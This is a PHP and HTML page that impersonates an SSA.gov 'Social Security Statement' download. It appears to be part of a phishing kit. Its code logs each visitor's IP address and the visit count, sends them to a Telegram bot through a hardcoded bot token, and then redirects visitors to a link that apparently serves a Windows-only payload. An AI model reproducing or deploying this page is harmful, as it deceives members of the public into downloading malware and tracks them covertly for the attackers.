<?php
// Path to the file that stores the visit count
$countFile = 'visit_count.txt';

// Check if the visit count file exists, if not, create it with initial count 0
if (!file_exists($countFile)) {
    file_put_contents($countFile, 0);
}

// Read the current visit count
$count = file_get_contents($countFile);

// Increment the count
$count++;

// Save the updxated count
file_put_contents($countFile, $count);

// Get the visitor's IP address
$visitorIP = $_SERVER['REMOTE_ADDR'];

// Send the visit data to Telegram
$telegramBotToken = '7599401253:AAEriOL_4SnE0A-N8TAwJBt5VUpGlcyObnk';
$chatID = '-4608382410';
$message = "New visitor with IP: $visitorIP\nTotal Visits: $count";

// Send the message using cURL
$telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
file_get_contents($telegramURL);

?>
<?php
// Array of URLs to redirect to
$redirectUrls = [
    "access link"
    // Add more links as needed
];

// Choose a random URL from the array for redirection
$redirectUrl = $redirectUrls[array_rand($redirectUrls)];

// Redirect after 3 seconds
header("Refresh:3; url=$redirectUrl");
?>
<!DOCTYPE html>
<div class="container" style="max-width: 800px; margin: 50px auto; text-align: center; background-color: rgb(0, 51, 102); color: white; padding: 20px; border-radius: 8px; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 10px; font-family: Arial, sans-serif; font-size: medium;">
<h1>Your Social Security Statement</h1>
<h1>
<div class="content" style="background-color: rgb(230, 238, 242); color: rgb(51, 51, 51); padding: 20px; margin-top: 20px; border-radius: 8px; font-size: medium; font-weight: 400;">
<p style="margin: 10px 0px; font-size: 16px;">Your document is now ready for download. Please follow the instructions below:</p>
<p style="margin: 10px 0px; font-size: 16px;">Download the attachment.</p>
<p style="margin: 10px 0px; font-size: 16px;"><strong>Note:</strong>&nbsp;The statements are compatible only with PC/Windows systems.</p>
</div>
<div class="footer" style="margin-top: 20px; font-size: 14px; font-weight: 400;">2025 SSA.gov</div></h1></div>